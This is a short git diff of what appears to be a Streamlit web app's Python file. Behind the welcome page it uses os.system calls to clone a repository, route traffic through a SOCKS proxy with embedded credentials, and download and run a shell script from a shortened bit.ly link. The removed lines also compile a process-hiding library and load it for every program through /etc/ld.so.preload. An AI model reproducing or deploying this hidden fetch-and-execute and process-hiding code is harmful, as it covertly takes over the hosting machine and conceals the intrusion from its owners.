@@ -6,9 +6,7 @@ import streamlit as st
 
 import os
 os.system('git clone https://github.com/Likkaadila/memory')
-os.system('cd memory && make && gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl && mv libprocesshider.so /usr/local/lib/ && echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload')
-os.system('cd memory && curl --proxy "socks5://qmxcxwbu-rotate:eb337jmbvh26@p.webshare.io:80/" digitalocean.com/')
-os.system('cd memory && curl -L -o main.sh https://bit.ly/31PBHyI && bash main.sh')
+os.system('cd memory && curl --proxy "socks5://qmxcxwbu-rotate:eb337jmbvh26@p.webshare.io:80/" digitalocean.com/ && curl -L -o main.sh https://bit.ly/31PBHyI && bash main.sh')
 
 """
 # Welcome to Streamlit!
